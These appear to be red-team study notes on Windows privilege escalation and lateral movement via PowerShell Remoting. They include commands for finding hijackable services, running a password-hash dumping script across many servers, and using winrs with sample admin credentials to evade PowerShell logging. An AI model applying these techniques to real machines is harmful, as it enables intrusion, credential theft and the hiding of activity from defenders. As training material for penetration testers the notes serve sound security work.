There are various ways of locally escalating privileges on Windows box:
- Missing patches
- Automated deployment and AutoLogon passwords in clear text
- AlwaysInstallElevated (Any user can run MSI as SYSTEM)
- Misconfigured Services
- DLL Hijacking and more
- NTLM Relaying a.k.a. Won't Fix

We can use below tools for complete coverage
- [[PowerUp]]: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- Privesc: https://github.com/enjoiz/Privesc
- [[winPEAS]] - https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS - Tends to be very noisy

Run all checks from :
- PowerUp `Invoke-AllChecks`
- Privesc: `Invoke-PrivEsc`
- PEASS-ng: `winPEASx64.exe`

# PowerUp

Services Issues using [[PowerUp]]:
- Get services with unquoted paths and a space in their name:
```powershell
Get-ServiceUnquoted -Verbose
```

Podríamos secuestrar la ejecución con un archivo con el mismo nombre en la misma ruta:

```powershell
C:\MyFTP\myFTP "\Service\..."
C:\MyFTP\myFTP.exe (malicious)
```

- Get services where the current user can write to its binary path or change arguments to the binary:
```powershell
Get-ModifiableServiceFile -Verbose
```

- Get the services whose configuration current user can modify:
```powershell
Get-ModifiableService -Verbose
```

# Lateral movement

## Powershell Remoting

Para movernos lateralmente entre máquinas utilizaremos *Powershell Remoting*, think about it as [[psexec]] on steroids but much more
silent and super fast!

- PSRemoting uses Windows Remote Management (WinRM) which is Microsoft's implementation of WS-Management.
- Enabled by default on Server 2012 onwards with a firewall exception.
- Uses WinRM and listens by default on 5985 (HTTP) and 5986 (HTTPS).
- It is the recommended way to manage Windows Core servers.
- You may need to enable remoting (Enable-PSRemoting) on a Desktop Windows machine, Admin privs are required to do that.
- The remoting process runs as a high integrity process. That is, you get an elevated shell

### Conexión 1 a 1

**PSSession**: Interactive, Runs in a new process (wsmprovhost), Is Stateful.

Useful cmdlets:
```
New-PSSession
Enter-PSSession
```

### Conexión 1 a muchos

Also known as Fan-out remoting. Non-interactive, Executes commands parallely.

Useful cmdlets:
```
Invoke-Command
```

Run commands and scripts on:

- multiple remote computers,
- in disconnected sessions (v3)
- as background job and more.
- The best thing in PowerShell for passing the hashes, using credentials and executing commands on multiple remote computers.

Use `-Credential` parameter to pass username/password.

Use below to execute commands or scriptblocks:
```powershell
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
```

Use below to execute scripts from files
```powershell
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

Use below to execute locally loaded function on the remote machines:
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
```

• In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```

In below, a function call within the script is used:
```powershell
Invoke-Command -Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

Use below to execute "Stateful" commands using Invoke-Command:
```powershell
$Sess = New-PSSession -Computername Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-
Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```

## WinRS

PowerShell remoting supports the system-wide transcripts and deep script block logging. We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
```powershell
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
```

We can also use winrm.vbs and COM objects of WSMan object - https://github.com/bohops/WSMan-WinRM

